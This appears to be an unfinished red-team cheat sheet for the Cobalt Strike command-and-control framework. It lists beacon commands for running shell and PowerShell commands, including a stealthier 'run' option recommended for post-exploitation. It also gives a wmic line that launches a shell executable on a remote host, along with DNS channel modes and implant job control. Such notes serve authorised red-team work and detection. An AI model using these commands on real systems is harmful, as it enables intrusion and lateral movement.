# Cobalt Strike

Search Tag(s): #cobalt-strike #command-and-control

TODO: Finish the missing basic information with screenshots

## 01 - Shell Handler

### 1.1 - HTTP

### 1.2 - HTTPS

### 1.3 - SMB

### 1.4 - TCP

### 1.5 - DNS

```
mode dns                  Use DNS A as data channel (DNS beacon only)
mode dns-txt              Use DNS TXT as data channel (DNS beacon only)
mode dns6                 Use DNS AAAA as data channel (DNS beacon only)
```

## 02 - Execute Shell Commands

Execute any `shell` command that the beacon spawns a process `cmd.exe`.

```
beacon> shell <command> [arguments]
```

Execute any `shell` command that the beacon spawns a process `/bin/bash`.

```
ssh> shell <command> [arguments]
```

Spawns a `cmd.exe` process but doesn't print the output

```
beacon> execute <command> [arguments]
```

Execute commands without spawning `cmd.exe` except the running process comes from the `conhost.exe`. This is highly recommended when you perform post exploitation activities.

```
beacon> run <command> [args]

beacon> run arp -a

beacon> run wmic.exe /node:<IP> [/user:<username> /password:<password>] win32_process call create "C:\path\to\shell.exe"
```

Spawns a child process of `powershell.exe`.

```
beacon> powershell <cmdlet> [args]
```

Executes unmanaged powershell command. Make sure to change the process when using the `spawnto` command.

```
beacon> powerpick <cmdlet> [args]
```

## 03 - Clear Beacon Queue

> [!TIP] Fat Fingered!
> When you accidentally issued a command to beacon. You can just `clear` it without terminate the implant.

```
beacon> clear

ssh> clear
```

## 04 - Jobs Queue

Queue jobs

```
beacon> jobs
```

Kill job ID

```
beacon> jobkill <jid>
```

## 05 - Terminate Implant

```
beacon> exit

ssh> exit
```